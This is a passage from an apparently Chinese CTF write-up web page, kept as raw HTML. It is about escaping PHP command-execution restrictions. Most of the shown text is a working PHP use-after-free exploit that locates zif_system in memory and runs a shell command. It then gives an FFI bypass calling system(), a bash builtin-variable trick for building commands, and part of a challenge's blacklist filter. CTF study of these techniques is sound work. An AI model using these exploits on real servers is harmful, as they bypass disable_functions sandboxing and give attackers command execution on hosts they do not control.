class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:<code>c=上面的脚本（URL编码）</code></p><p>利用SQL读取文件：</p><p><img src="/images/image-20220908003516868.png" alt="image-20220908003516868"></p><h2 id="FFI绕过"><a href="#FFI绕过" class="headerlink" title="FFI绕过"></a>FFI绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个system对象</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag > 1.txt'</span><span class="token punctuation">;</span><span class="token comment">//没有回显的</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过$ffi去调用system函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后访问1.txt</p><h2 id="利用bash的内置变量构造命令"><a href="#利用bash的内置变量构造命令" class="headerlink" title="利用bash的内置变量构造命令"></a>利用bash的内置变量构造命令</h2><p><img src="/images/image-20220908003130019.png" alt="image-20220908003130019">nl flag.php</p><p>首先是知道flag是在flag.php中的，题目有说明</p><p>接着从正常的内置命令中，截取字符构造出想要的字符</p><p><img src="/images/image-20220808132345314-1662567433523.png" alt="image-20220808132345314"></p><p>由于hint中给了一张图，一张路劲的图片，一张ls</p><p>然后用${PATH:A}表示n，${PWD:A}代表l，就有了nl</p><p>nl，然后执行命令</p><p><img src="/images/image-20220908003217163.png" alt="image-20220908003217163"></p><h2 id="利用进制转换构造出字母"><a href="#利用进制转换构造出字母" class="headerlink" title="利用进制转换构造出字母"></a>利用进制转换构造出字母</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string 